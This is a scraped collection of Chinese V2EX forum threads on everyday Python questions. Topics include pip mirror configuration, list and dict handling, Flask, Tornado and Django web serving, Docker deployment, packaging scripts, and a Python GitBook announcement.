*args):\r", "            for index, text in enumerate(line):\r", "                if not text:\r", "                    continue\r", "                ws.write(row[0], index, text, *args)\r", "            row[0] = row[0] + 1\r", "\r", "        write_line([ '… blablabla …' ])\r", "        for archive in archives:\r", "            write_line([\r", "                '… blablabla …'\r", "            ])\r", "\r", "        excel = io.BytesIO()\r", "        wb.save(excel)\r", "\r", "        excel = excel.getvalue()\r", "        self.set_header('Content-Type', 'application/vnd.ms-excel')\r", "        self.set_header('Content-Length', len(excel))\r", "        self.write(excel)\r", "```", " 这个是 Tornado 用的，你改下罢……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"cover\" src=\"https://ofaatpail.qnssl.com/2017-01-03-explore-python-cover.png\"></p>\n<p>在学习和使用 Python 的过程中，我作了不少笔记，并对一些笔记进行了加工和完善，发表在博客上。随着笔记的增加，我就萌生了写一本书的想法，希望能比较系统地总结相关知识，巩固自己的知识体系，而不是停留在『感觉好像懂了』的状态中。</p>\n<p>有了想法之后，接下来就要开始写了。当然，从产生想法到付诸实践还是纠结了一段时间，毕竟，作笔记和写书很不一样啊。思想斗争过后，我下定决心要把它写出来。</p>\n<p>首先，我参考一些相关的书籍，作了一个基础的思维导图，如下：</p>\n<p><img alt=\"思维导图\" src=\"https://ofaatpail.qnssl.com/2017-01-03-explore-python2.png\"></p>\n<p>接下来，就要开始写作了，这也是最艰难的一关。</p>\n<p>我没有按照从头到尾的顺序写，而是从最感兴趣的知识点入手，比如函数式编程、类的使用等等。就这样，一点一点地写，实在不想写了，就先搁置一下，过两天继续写。</p>\n<p>我在写作的过程中，给自己提了一个要求：<strong>尽量深入浅出，条理清晰</strong>。至于是否达到了，希望读者们多多批评指正，并给我提意见和建议。</p>\n<p>目前，本书的目录如下（基本对应上面的思维导图）：</p>\n<ul>\n<li>第 1 章：介绍一些基础知识，包括 Python 中的输入和输出，字符编码。</li>\n<li>第 2 章：介绍常用数据类型，比如字符串、列表和字典等。</li>\n<li>第 3 章：介绍函数的定义和函数参数魔法。</li>\n<li>第 4 章：介绍 Python 中的函数式编程，包括匿名函数、闭包和装饰器等。</li>\n<li>第 5 章：介绍 Python 中类的使用，包括类方法、静态方法、 super 和元类的使用等。</li>\n<li>第 6 章：介绍 Python 中的高级特性，比如生成器，上下文管理器。</li>\n<li>第 7 章：介绍文件和目录操作， os 的使用。</li>\n<li>第 8 章：介绍使用 Python 处理进程、线程和协程。</li>\n<li>第 9 章：异常处理。</li>\n<li>第 10 章：单元测试。</li>\n<li>第 11 章：正则表达式， re 模块的使用。</li>\n<li>第 12 章： HTTP 服务， requests 模块的使用。</li>\n<li>第 13 章：一些标准模块的使用，比如 argparse 、 collections 和 datetime 等。</li>\n<li>第 14 章：一些第三方模块的使用。</li>\n<li>第 15 章：结束语。</li>\n</ul>\n<p>本书的编码环境：</p>\n<ul>\n<li>Python 版本以 2.7 为主，同时也会指出在 Python3 中的相应变化</li>\n<li>操作系统使用 macOS ，代码结果，尤其是内存地址等由于运行环境的不同会存在差异</li>\n</ul>\n<p>最后，附上书籍地址：<a href=\"https://github.com/ethan-funny/explore-python\" rel=\"nofollow\">GitHub 地址</a>。</p>\n<p>谢谢!</p>\n</div></div>"], "reply": "105", "tittle": "我的开源 GitBook: Python 之旅", "comment": [" ，可能需要翻墙，我刚更新了一下，可以下载 epub 版本，下载链接：\r", "\r", "\r", "谢谢。", " ，可能需要翻墙，我刚更新了一下，提供 epub 版本的下载：\r", "\r", "\r", "谢谢。", " ，过奖了，精力有限，就不乱写了。", "  非常感谢！", "赞，值得借鉴。"]},
{"content": ["<div class=\"topic_content\">如题，安装时下载速度如何？我按照搜素到的一些方法，设置为阿里云的镜像，但是最近速度很慢，最高十几 kb ，基本上都是几 kb ，经常 time out ，让人抓狂啊</div>", "<div class=\"topic_content\">在网上找了好久，终于解决了 找到一位大神的办法，主要之前设置的豆瓣镜像的地址不对，这个是 https 的，实测下载速度飞快，希望可以帮到大家：\r<br>\r<br>python3 一行流:\r<br>\r<br>windows 系统，将以下一行代码粘贴到 python IDLE 中回车执行，将会自动建立 pip.ini,把 pip 源默认为豆瓣源。\r<br>\r<br>import os ; ini = \"[global]\\nindex-url = <a target=\"_blank\" href=\"https://pypi.doubanio.com/simple/%5Cn&amp;quot\" rel=\"nofollow\">https://pypi.doubanio.com/simple/\\n&amp;quot</a>; ; pippath=os.environ[\"USERPROFILE\"]+\"\\\\pip\\\\\" ; exec(\"if not os.path.exists(pippath):\\n\\tos.mkdir(pippath)\"); open(pippath+\"/pip.ini\",\"w+\").write(ini)</div>"], "reply": "19", "tittle": "请教各位，你们的 pip 源如何设置的？", "comment": ["我设置的清华的。 ", "`cat ~/.pip/pip.conf`\r", "\r", "```\r", "[global]\r", "index-url=https://pypi.douban.com/simple\r", "```", "~/.pip/pip.conf\r", "\r", "[global]\r", "index-url = ", "谢谢以上几位，阿里、豆瓣、清华的镜像都试过了，一个 django 都装不上，也许是我网络有问题", "http_proxy", "我是自己用 nexus oss 搭的代理源，通过国外的代理服务器直接连接官方源", " 只保留一个源试试，比如豆瓣", "没设置过，速度尚可", "你的网有问题  换运营商才是上策", "默认设置，速度不错", "今天亲测，豆瓣的源很快", "我直接在命令上加-i ", "豆瓣源一直满稳定", "一直用豆瓣", "阿里的源也不错", " 呃，竟然没仔细看你发的链接", " 用我发的解决了？", "windows 下\r", "用户目录\\pip\\pip.ini\r", "\r", "[global]\r", "index-url = ", "\r", "[install]\r", "polipo 转发 shadowsocks. 好用。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>python 入门很快，可是细枝末节的东西还是很多的，弄不明白。</p>\n<pre>In [1]: list1 = list(range(5))\nIn [2]: for i in list1:\n   ...:     i = 100\n   ...:     \nIn [3]: list1\nOut[3]: [0, 1, 2, 3, 4]\n</pre>\n<p><strong>list1 没变化。</strong></p>\n<pre>In [4]: list2 = []\nIn [5]: for i in range(5):\n   ...:     list2.append(list(range(i)))\n   ...:     \nIn [6]: list2\nOut[7]: [[], [0], [0, 1], [0, 1, 2], [0, 1, 2, 3]]\nIn [8]: for i in list2:\n    ...:    i.append('end')\n    ...:     \nIn [9]: list2\nOut[9]: [['end'], [0, 'end'], [0, 1, 'end'], [0, 1, 2, 'end'], [0, 1, 2, 3, 'end']]\n</pre>\n<p><strong>list2 中的每个列表都变化了,换成 dict 也是变了的。</strong></p>\n<p>前面是值传递？后面是引用传递？\n抱歉，我知道 c++里这么叫，请教 python 里这是什么特点？</p>\n<p>python 的书现在越来越多，入门的都讲的太简单，就跟给小学生看的一样，看完入门书用 python 写代码到处都是问题。\n请问大家有没有推荐好些的中高级进阶的书？最好中文，看得快，不要讲 api 或者应用的，要谈语法或者语言特性的？</p>\n<p>被 c++虐惯了，换到 python 就只告诉你简单，可是后面的坑得自己一个一个去踩，真心不爽。</p>\n</div></div>"], "reply": "13", "tittle": "关于 python 里的值传递", "comment": ["python 里面都是引用，所以 a=x 只是把 a 指向另外一个对象并不会修改 a 原来指向的对象的值。然后， python 里面有 mutable 和 immutable 对象的概念，可以了解一下", "python 中不存在所谓的传值调用，一切传递的都是对象的引用，也可以认为是传址。 python 中，对象分为可变(mutable)和不可变(immutable)两种类型，元组（ tuple)、数值型（ number)、字符串(string)均为不可变对象,而字典型(dictionary)和列表型(list)的对象是可变对象。\r", "\r", "a = 1 #将名字 a 与内存中值为 1 的内存绑定在一起\r", "a = 2 #将名字 a 与内存中值为 2 的内存绑定在一起，而不是修改原来 a 绑定的内存中的值。", "in python ,everything is a object.", "anything", "C++ 里面的 foreach (Range-based for loop) 也是类似的吧", "第一次 1 个列表\r", "第二次是 list(range(i)) ，每一次里面又有一次列表，列表从 0 到 i 。", " 我知道……", " \r", " \r", "谢谢二位。我知道可变和不可变对象的概念。\r", "\r", "自己想明白了，一直以为是 for 处理不同类型有区别，其实这里的关键在于“=”， append 方法修改了引用的对象，即列表中的列表，而“=”是重新绑定引用对象了。我试了第二个循环里如果写成 i = ['end']，原二维列表也不变了。", " 你是说 STL algorithm 库里的 for_each ，还是 c++11 的 range for loop ？这是两个概念。这里问题的关键在于 python 里的“=”赋值的问题。", " 我括号里说明了，并且我没看出来你这个两个样例中 python 的 = 有什么区别，因为你第二个里面没用到 = ，\r", "\r", "如果说你第二个里面写的是 \r", "In [8]: for i in list2:\r", "    ...:    i = ['end']\r", "\r", "倒是可以有比较", "维基有详细解释： ", "\r", "这翻来覆去讨论的问题，知乎是有，不知道本站有没有\r", "\r", "效果和 C++的引用传递类似，不过不能用来把函数调用者作用域内的变量改掉（ out parameter 可以返回元祖代替），所以不叫引用传递", "从行为来说， immutable 的类型和值类型一样， mutable 的类型和指针一样\r", "正经的解释当然是名字绑定什么的那些\r", "等价的 C++ 代码大概是：\r", "```\r", "#include <iostream>\r", "#include <vector>\r", "\r", "template<typename T> void print(T& arg) {\r", "    std::cout << arg << \", \";\r", "}\r", "template<typename T> void print(std::vector<T>* list) {\r", "    for (auto& i : *list) {\r", "        print(i);\r", "    }\r", "    std::cout << std::endl;\r", "}\r", "\r", "std::vector<int>* range(int length) {\r", "    auto result = new std::vector<int>();\r", "    for (int i = 0; i < length; ++i) {\r", "        result->push_back(i);\r", "    }\r", "    return result;\r", "}\r", "int main() {\r", "    auto list1 = range(5);\r", "    print(list1);\r", "    for (auto i : *list1) {\r", "        i = 100;\r", "    }\r", "    print(list1);\r", "\r", "    auto list2 = new std::vector<std::vector<int>*>();\r", "    for (int i = 0; i < 5; ++i) {\r", "        list2->push_back(range(i));\r", "    }\r", "    print(list2);\r", "    for (auto i : *list2) {\r", "        i->push_back(-1);\r", "    }\r", "    print(list2);\r", "    for (auto i : *list2) {\r", "        i = range(0);\r", "    }\r", "    print(list2);\r", "    return 0;\r", "}\r", "```", "一般这种奇怪的问题，大多数都能从 bytecode 上找到原因。楼主给的第一种情况的字节码是这样的:\r", ">>> dis.dis(list_change)\r", "  2           0 LOAD_GLOBAL              0 (list)\r", "              3 LOAD_GLOBAL              1 (range)\r", "              6 LOAD_CONST               1 (5)\r", "              9 CALL_FUNCTION            1\r", "             12 CALL_FUNCTION            1\r", "             15 STORE_FAST               0 (list1)\r", "\r", "  3          18 SETUP_LOOP              20 (to 41)\r", "             21 LOAD_FAST                0 (list1)\r", "             24 GET_ITER            \r", "     >>   25 FOR_ITER                12 (to 40)\r", "             28 STORE_FAST               1 (each)\r", "\r", "  4          31 LOAD_CONST               2 (1)\r", "             34 STORE_FAST               1 (each)\r", "             37 JUMP_ABSOLUTE           25\r", "     >>   40 POP_BLOCK           \r", "     >>   41 LOAD_CONST               0 (None)\r", "             44 RETURN_VALUE\r", "\r", "您可以注意 index 为 28,34 的 STORE_FAST ，根据字节码来看，你给的第一种情况和下面的代码是等效的：\r", "list1 = list(range(5))\r", "for index in range(len(list1)):\r", "    i = list1[index]\r", "    i = 100\r", "\r", "所以， list1 的内容是不会发生改变的。"]},
{"content": ["<div class=\"topic_content\">#运算符\r<br>#算术运算符&gt;比较运算符&gt;逻辑运算符\r<br>#算术运算符：(+,-,*,/,**,//.....)\r<br>#比较运算符:(&gt;,&gt;=,&lt;,&lt;=)返回 bool 类型\r<br>#赋值运算符:(+=,-=,=)\r<br>#逻辑运算符:(and,or)返回 bool 类型或能隐示转换为 bool 类型.返回值都是 bool 类型.\r<br>#运算符从左往右执行,当 and 满足所有条件返回最后一个结果,当 or 遇到满足条件,停止计算提前返回结果.\r<br>#程序结构:(顺序结构:从上往下,一行一行执行)\r<br>#单分支：\r<br>开始\r<br>if&lt;条件&gt;:\r<br>    操作\r<br>结果\r<br>#多分支\r<br>开始\r<br>if&lt;条件&gt;：\r<br>    操作\r<br>elif&lt;条件&gt;:\r<br>    操作\r<br>else:\r<br>    操作\r<br>结果\r<br>#for in 循环(遍历)\r<br>开始\r<br>for 元素 in 可迭代对象:\r<br>    操作\r<br>结束\r<br>#for else 字句(当循环没有提前退出执行 else 语句)\r<br>#while 循环(条件循环)\r<br>开始\r<br>while&lt;条件&gt;:\r<br>    操作\r<br>结束\r<br>#break(立即结束循环)continue(跳过剩下部分)\r<br>\r<br>列表\r<br>#列表是可变的,可通过下标访问列表元素\r<br>#可用函数 list()表示\r<br>#可用中括号定义[]\r<br>#可通过 index 查找其中元素,从左往右查找,star,stop 可为负数,当 star 比 stop 大时抛出 VarlueError\r<br>#当查找索引超出范围 VarlueErron\r<br>#index 实现函数\r<br>def index(lst,value,star = 0, stop = -1):\r<br>    x = star\r<br>    for i in lst[star:stop]:\r<br>        if i == value:\r<br>            return x\r<br>        x += 1\r<br>    raise ValueError()</div>"], "reply": "目前尚无回", "tittle": "Python 学习笔记 1", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>list1 = [{'name': 'Tom', 'score':90}, {'name': 'Jack', 'score':86}, {'name': 'Lisa', 'score':81}, {'name': 'Bill', 'score':70}]</p>\n<p>list2 = [{'name': 'Jack', 'score':86}, {'name': 'Bill', 'score':70}, {'name': 'Bob', 'score':48}]</p>\n<p>怎么把 list1 和 list2 去重合并到一个新的 list_all （保持 score 的顺序），把重合的部分拆分到一个新的 list_new:</p>\n<p>list_all = [{'name': 'Tom', 'score':90}, {'name': 'Jack', 'score':86}, {'name': 'Lisa', 'score':81}, {'name': 'Bill', 'score':70}, {'name': 'Bob', 'score':48}]</p>\n<p>list_new = [{'name': 'Jack', 'score':86}, {'name': 'Bill', 'score':70}]</p>\n</div></div>"], "reply": "26", "tittle": "怎么把 list1 和 list2 中包含的重复字典去除，合并生成一个新的 list_all？", "comment": ["可以用 dict.update ，相同 key 的话新值会替换旧值", "看错了不好意思，这种复杂结构只能手动遍历了吧", "list_all = sorted(list1+list2, key=lambda x: x['score'], reverse=True)\r", "list_new = [i for i in list1 if i in list2]", " 谢谢！你的 list_all 的方式不去重 ...  我在“去重”上的实现绕了好多圈，自己都看不过去了 *_*", "去重这样: {v['name']:v for v in list1+list2}.values()\r", "list_all = sorted([dict(i) for i in set([tuple(d.items()) for d in list1+list2])], key=lambda x: x['score'], reverse=True)\r", "list_new = [i for i in list1 if i in list2]\r", "\r", "在 @", "  的答案上稍微修改了下，其实这么多转换，我也看不过去了", " 这个方法好", " 谢谢，我开始是用循环迭代去搞的\r", "\r", "    list_all = []\r", "    list1.extend(list2)\r", "    for temp in list1:\r", "\tif temp not in list_all:\r", "\t\tlist_all.append(temp)", "list_new = [i for i in list1 if i in list2] \r", "l1 = [i for i in list1 if i not in list2]\r", "l2 = [i for i in list2 if i not in list1]\r", "list_all = list_new + l1 + l2\r", "print(list_all)", " \r", "呃，要排序啊……忘了这个", " 第一个 all 的忘记去重了，下面那个人方法不错", "s1 = set(list1)\r", "s2 = set(list2)\r", "list_all = list(s1.intersection(s2))", " \r", "这个 set 不报错么？", " unhashable type: 'dict'", "遇到过差不多的问题, 我是把 list 里面每一项转成 json 然后用 set 去重再转回来", "上面 @", " @", " @", " 的方法推荐学习，感谢！", "for ..if .. in..", "ruby 可以直接 list1 | list2", "如果要保存顺序的话好像只能循环的一个一个去看\r", "\r", "如果不要顺序的话 linux 下 sort + comm 可以轻松做到各种集合结果", "```\r", "temp = []\r", "\r", "def foo(x):\r", "    if x not in temp:\r", "        temp.append(x)\r", "        return x\r", "\r", "print filter(foo, list1 + list2)\r", "```", "from operator import itemgetter\r", "from collections import Counter\r", "\r", "# 合并列表, 思路是先将字典转为可哈希的元组\r", "list_merged = [dict(t) for t in set([tuple(d.items()) for d in list1+list2])]\r", "\r", "# 根据字典某个值来排序, 官方库有推荐姿势 -- operator.itemgetter\r", "sorted(list_merged, key=lambda k: k['score'], reverse=True)  # 没用 itemgetter\r", "sorted(list_merged, key=itemgetter('score'), reverse=True)  # 使用 itemgetter\r", "\r", "# 保存重合项\r", "list_tuple = [tuple(d.items()) for d in list1+list2]  # 仍先转为元组, 使其可哈希\r", "counts = Counter(list_tuple)  # 通过 collections.Counter 查找重复项, 只接受可哈希对象\r", "item_dups = set([i for i in list_tuple if counts[i] > 1])  # 保留出现次数大于 1 的项, 并去重\r", "list_new = [dict(t) for t in item_dups]  # 元组转回到字典对象", " 用集合的合并", "import numpy as np\r", "list_unique=list(np.unique(np.array(list1+list2)))", " 补上交集的\r", "list_inter = list(np.intersect1d(list1, list2))", " 试了下你的方法..无法去除重复，明天我也试下", "list_new = []\r", "list_all = []\r", "list_only = []\r", "list1 = [{'name': 'Tom', 'score':90}, {'name': 'Jack', 'score':86}, {'name': 'Lisa', 'score':81}, {'name': 'Bill', 'score':70}]\r", "list2 = [{'name': 'Jack', 'score':86}, {'name': 'Bill', 'score':70}, {'name': 'Bob', 'score':48}]\r", "\r", "# list_new = [i for i in list1 if i in list2]\r", "for i in list1:\r", "    if i in list2:\r", "        list_new.append(i)\r", "    else:\r", "        list_only.append(i)\r", "    \r", "list_all = list_only+list_new\r", "\r", "print(list_new)\r", "print(list_all)\r", "\r", "虽然实现了 lisr_new 和 list_all ，但是发现 lsit_all 没保持 score 的顺序，试着 list_all = sorted(list_only+list_new)，结果 typeerror 。 T,T"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/honmaple/maple-json/blob/master/serializer.py\" rel=\"nofollow\">地址在这</a></p>\n<h1>具体使用</h1>\n<p>使用上很简单(以 flask-sqlalchemy 为例),原生<strong>sqlalchemy</strong>类似</p>\n<h2>多个实例</h2>\n<pre><code>posts = Post.query.all()\nserializer = Seralizer(posts,many=True)\ndata = serializer.data\n</code></pre>\n<h2>单个实例<a></a></h2>\n<pre><code>post = Post.query.first()\nserializer = Seralizer(post,many=False)\ndata = serializer.data\n</code></pre>\n<h2>排除字段</h2>\n<pre><code>serializer = Seralizer(post,exclude=['title'])\n</code></pre>\n<h2>only 字段</h2>\n<pre><code>serializer = Seralizer(post,include=['title'])\n</code></pre>\n<h2>关系查询深度</h2>\n<pre><code>serializer = Seralizer(post,depth=3)\n</code></pre>\n<ul>\n<li>depth\n默认为 2</li>\n</ul>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>我的坑 <strong>Seralizer</strong> ---&gt; <strong>Serializer</strong></p>\n</div></div>"], "reply": "4", "tittle": "分享一段 sqlalchemy 序列化代码", "comment": ["是否考虑非外键关联的实现呢，个人在开发中基本不使用外键。", "请问， Seralizer 是从哪里导入?", "应该是 Serializer", " 非外键关联由于实际还未用到，暂时没考虑，不过可以去掉外键相关，并且传入相应的参数"]},
{"content": ["<div class=\"topic_content\">各位前辈，比如我的电脑共享了一个纯 python 脚本，但其他用户电脑上没有装 python ，能够实现直接运行脚本吗，如果可以，需要我的电脑怎么部署，请前辈指点^^</div>", "<div class=\"topic_content\">用 exe 不合适啊，打包起来有 25m,服务器电脑在杭州，用户在上海，执行起来很慢，还不能上传 exe,有什么更好的办法呢</div>"], "reply": "21", "tittle": "怎样才能够直接运行 python 脚本呢？", "comment": ["Mac 和 Ubuntu 等 linux 系都可以， Win10 的话，最新加入了 Bash 也可以。其他没有安装 Python 环境的跑不起来了", "虽然不是最好的办法，但是可行。  你可以利用 PyInstaller 将 Python 可运行脚本打成一个 exe 然后发给其他电脑运行\r", "这里只考虑 win 。", "Win 下 Python.exe *.py 好像可以？", "pyinstaller 还有一个 py2exe 推荐前者。", "pyinstaller 是个解决方案，比较 ugly 。\r", "\r", "看你的样子是 Windows ，试试 c#吧。", "win 的话，有绿化版的 py 用批处理进行调用就好。", " 说的对，都用 win 了，上 C#", "用 winrar 打包个自解压程序", "做成 exe 呗", "run ****.py", "windowd 下安装好的 python ，可以将安装目录的文件夹打包，发给别人，然后在 cmd 中指定 python.exe 的路径，运行 py 文件。\r", "比如目录如下:\r", "code/python/python.exe\r", "code/run.py\r", "可以在 code 目录下，打开 cmd ，执行\r", "./python/python.exe run.py\r", "写到 .bat 文件里面，运行 .bat 就可以运行脚本了。", "pyinstaller+1", "python-3.5.2-embed-amd64.zip  6.5 ，官方下载。", "可以打包成 exe 的，你 google 一下", "都有服务器器了，干脆再开发个 web app ，让用户去操作啊", "打包成 exe 其实相当于把 Python 环境也打包进去，实在太大了，楼上提的弄成 web app 是一个思路，用 django flask 之类的稍微包装下。", "把 python runtime 打包，可以参考 goagent", "这个取决于你的业务需求啊\r", "1.web 的方式,如果不需要操作本地资源,只是显示一下这是可以的\r", "2.所有机器上安装好 python 运行环境,一劳永逸的事情\r", "3.重新编译 python 源码,精简并定制一下,用户双击 python.exe 时直接运行同目录下的 main.py 脚本,我编译了一个定制的,打包后就 2M 多(大小取决于用到的库),可以直接运行脚本 ", "可以参考这个，未压缩时才 30MB 不到\r", "![pic1]( ", ")\r", "![pic2]( ", ")\r", "![pic3]( ", ")", " 用什么开发 web app,其实没有什么服务器，就是我的个人电脑", " web 方式，可以执行本地化的脚本吗，比如操作 excel,用 pandas 分析，给用户结果"]},
{"content": ["<div class=\"topic_content\">接上篇 ：）查看完整帖子请猛戳链接： <a target=\"_blank\" href=\"https://uqer.io/community/share/5850c09f6baac8005093da14\" rel=\"nofollow\">https://uqer.io/community/share/5850c09f6baac8005093da14</a>\r<br>\r<br><a target=\"_blank\" href=\"/i/qzv72HLRl.png\" title=\"在新窗口打开图片 qzv72HLRl.png\"><img src=\"//i.v2ex.co/qzv72HLRl.png\" class=\"embedded_image\"></a>\r<br>\r<br><a target=\"_blank\" href=\"/i/uB1IbfBBl.png\" title=\"在新窗口打开图片 uB1IbfBBl.png\"><img src=\"//i.v2ex.co/uB1IbfBBl.png\" class=\"embedded_image\"></a>\r<br>\r<br>The Whole Thing\r<br>\r<br><a target=\"_blank\" href=\"/i/MhrPA55Dl.png\" title=\"在新窗口打开图片 MhrPA55Dl.png\"><img src=\"//i.v2ex.co/MhrPA55Dl.png\" class=\"embedded_image\"></a>\r<br>\r<br><a target=\"_blank\" href=\"/i/zzFkN0yll.png\" title=\"在新窗口打开图片 zzFkN0yll.png\"><img src=\"//i.v2ex.co/zzFkN0yll.png\" class=\"embedded_image\"></a>\r<br>\r<br><a target=\"_blank\" href=\"/i/qd8ls7MTl.png\" title=\"在新窗口打开图片 qd8ls7MTl.png\"><img src=\"//i.v2ex.co/qd8ls7MTl.png\" class=\"embedded_image\"></a></div>"], "reply": "目前尚无回", "tittle": "机器学习与因子透视：量化流程思考 （中）", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如 V2EX 这样，当有人顶了这个帖子时，这个帖子就会排到最前面。</p>\n</div></div>"], "reply": "5", "tittle": "django 如何实现按照评论的最后回复时间排序？", "comment": ["没用过 django ，不过有种设想，给评论单独设计一个表，然后评论表有个 id 关联 post ；然后评论表的 primary key 为自增 id ，最后根据自增 id 对 post 排序。。。我觉得可实现", "帖子表里记录最后回复的时间", " \r", " 谢谢，解决了。 django 的 orm 系统支持跨表查询和数据库函数，于是我查出这篇帖子的全部评论然后取评论发布时间的 max 值，用这个值排序就实现了。", "我好懒，直接用多说了😁", " 哈哈，简单的需求用多说还可以，自己写便于定制。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前配置网站的时候，使用 flask 的<code>url_for</code>来配置静态文件，但是配合 nginx 后，访问网站，静态文件总是 404 ；\n后来就干脆使用 nginx 配置静态文件了。\n或者，我的姿势不对(⊙o⊙)</p>\n</div></div>"], "reply": "7", "tittle": "flask+nginx，静态文件使用 nginx 配置，还是使用 flask 配置 url_for?", "comment": ["flask-cdn + url_for 更灵活\r", "静态文件直接丢给 Nginx 比较好", "如果是用 CDN 的话，当我没说 😂", "静态文件当然用 nginx", "我们的解决方案是静态丢给 nginx 作为 CDN 的源站，既然 nginx 就能处理的事情，就没有必要再转发给 flask 了。\r", "\r", "但是既然用到 CDN 了，就算转发给 flask ，压力也不会太大，所以在 lz 说的这种场景下，我觉得可以更多的考虑其它因素进行决策。", "在没有 CDN 的情况下，静态文件交给 Nginx 肯定是最好的选择", "我把我的静态文件都丢给 flask 了"]},
{"content": ["<div class=\"topic_content\">有长期使用 PyPy 生产的兄弟吗？ pypy 用了一段时间好吃内存啊，不知道各位实际生产情况 PyPy 稳定性和资源占用情况如何</div>"], "reply": "4", "tittle": "目前 pypy 适合长期跑爬虫项目吗？", "comment": ["官网介绍说 pypy 运行的程序用的内存更少?\r", "这就奇怪了..", "jit 的编译过程肯定占用内存，至于他和 cpython 的对比，可能你的程序规模还不足以体现出两者的区别，特别是在大量调用没有为 pypy 优化的 c 扩展的时候", "觉得 pypy 费内存可以试试 jvm 。😂", "不适合"]},
{"content": ["<div class=\"topic_content\">import tornado.httpserver\r<br>import tornado.ioloop\r<br>import tornado.options\r<br>import tornado.web\r<br>\r<br>\r<br>class IndexHandler(tornado.web.RequestHandler):\r<br>    def get(self):\r<br>        比如我想在这里执行:\r<br>         open(\"./qq.csv\") as f:\r<br>               f.write(\"string\")\r<br>          pandas.read_excel(\"./qq.xls\")\r<br>          while True ：\r<br>                  执行任何语句\r<br>         想实现的就是，告诉别人一个网址，浏览器后就执行 get 里面的所以任意语句。怎么实现呢，请前辈指点哈\r<br>         我试了下，自己电脑浏览器打开里面的语句都被执行了，但是到别人电脑上打开就不行，我的目的是用我的电脑，作为执行这些脚本的服务器，那样其他人就不用装python,和依赖，也不用打包成exe了，这样实现可行吗\r<br>\r<br>if __name__ == \"__main__\":\r<br>    tornado.options.parse_command_line()\r<br>    app = tornado.web.Application(handlers=[(r\"/\", IndexHandler)])\r<br>    http_server = tornado.httpserver.HTTPServer(app)\r<br>    http_server.listen(options.port)\r<br>    tornado.ioloop.IOLoop.instance().start()</div>"], "reply": "2", "tittle": "flask 或 toanado，视图函数里面的语句都可以被执行吗", "comment": ["exec 语句。", "不过建议事先做好沙盒测试再上线。", "不然......", " 为什么我在自己电脑运行上面的服务可以执行，到别人的电脑就没反应了呢。用 exec 语句有什么问题"]},
{"content": ["<div class=\"topic_content\">对 Python Web 应用部署有一些疑惑，还请各位大神路过指点指点。\r<br>\r<br>以前部署通常 nginx+gunicorn+flask 依赖用 `pip -r requirements.txt` 来安装。\r<br>后来接触了 Docker 和 Anaconda 包管理，想利用来做以后 web 项目的部署，但是不知道怎么结合最好。\r<br>\r<br>1. Docker+Miniconda 是否比 Docker+pip 来的高效？\r<br>conda 的确是比 pip 好用些，能安装上不少 pip 安装不了的依赖，但是也有遇到 pip 能安装但是 conda 上找不到的情况，例如 flask_environments, flask_sqlalchemy 等一众 flask 扩展。\r<br>\r<br>2. 是将 nginx 、 gunicorn 、 flask app 各自装填到不同的容器当中运行还是？</div>"], "reply": "8", "tittle": "Docker+Miniconda+Flask 部署", "comment": ["不知道你说 pip 安装不了的是指什么？\r", "\r", "个人觉得 gunicorn 和 app 一个容器， Nginx 另一个或者直接放外面。毕竟 Nginx 单纯用作 load balance ，问题不大", "个人觉得既然都用 Docker 了，就把所有依赖都写进 Dockerfile 如何？同时维护 Dockerfile 和 requirements.txt 好麻烦…… pip install 搞不定的就在 Dockerfile 里手动装。", "不建议用 conda 做 production 。 Docker 官方有 Python 各版本的镜像。", "个人习惯 ", "gunicorn+flask 一个容器. mongo 一个容器. nginx 装在宿主机", " pip 的话比如 pillow 就比较难安装上， conda 就可以通过 conda install 直接安装编译过的", " 你是说 gcc 部分？\r", "我是一般 dockerfile 里写上，因为反正还有其他依赖要装\r", "用 pip 主要是因为 rpm 太旧", " @", "  谢谢二位的方案，我之后尝试一下。", "做测试的时候现搞个 virtualenv ，然后测试完了再 pip freeze > requirements.txt\r", "我是从最基础的镜像开始构建的，写个 dockfile, 把 requirements.txt 放进去用 Pip 安装。\r", "然后放 flask 工程文件，把 gunicorn 搞定。然后 build 就差不多了\r", "nginx 你可以玩 docker 或者只用用宿主的."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>声明</h2>\n<p>帮好朋友宣传一下，朋友是群里的群主。本人只是其中管理员之一。申请的人备注是 V 友呦。<img alt=\"\" src=\"http://i.imgur.com/Xr31puI.jpg\"></p>\n<h2>QQ 群</h2>\n<ul>\n<li>QQ 交流群： 555670668 大家可以进群交流技术问题。</li>\n<li>QQ 逗比群： 524334549 大家可以在这个群吹逼斗图。</li>\n</ul>\n<h2>这里是群主的知乎专栏</h2>\n<ul>\n<li><a href=\"https://zhuanlan.zhihu.com/c_42227538\" rel=\"nofollow\">雨敲窗 python 入门教程</a></li>\n</ul>\n<h2>摘自群主文章里的一段话</h2>\n<p>写这个教程的初衷是为了整理一下自己的 python 技术栈，算是总结总结，没想到一发不可收拾，慢慢有了一些体系，偶然的机会回答了一个问题，承蒙各位错爱，得到了快两百个赞，虽然远比不上各种大 V ，但给了我很大的鼓励，故开此专栏，希望能帮助更多的人入门 python 。</p>\n<p>自己在 python 的学习道路上摸索了一些方法，也知道小白入门的痛点在哪里，所以这有可能是你见到的最简洁的 python 入门教程了，每节课视频长度 5 到 10 分钟，不会很长，每天睡前或者早起看一两节课，花个一两个小时敲一敲代码，用不了多久就可以入门了。</p>\n<p>教程还在持续更新中，目前讲到了 python 实战——爬虫，后续还会讲 web 开发。大家学完这个教程后，每人都能写一套爬虫、做一个微信公众号，并且会明晰该如何接着在 python 的路上往下走。</p>\n<h2>最后</h2>\n<p>欢迎大家加入。撒花<img alt=\"\" src=\"http://i.imgur.com/Ge7PjrS.png\"></p>\n</div></div>", "<div class=\"topic_content\">## 一群已经满喽，大家可以加 2 群哦。 QQ 群： 593772252</div>"], "reply": "3", "tittle": "欢迎 python 的菜鸟，大神，来我们群呦（帮好朋友群主宣传一下）", "comment": ["正在学习 python ，也很喜欢这门编程语言。谢谢分享教程，希望能够持续更新。", " 不用谢，一起学习。/认真脸", "知乎专栏 5 个月未更新。。。"]},
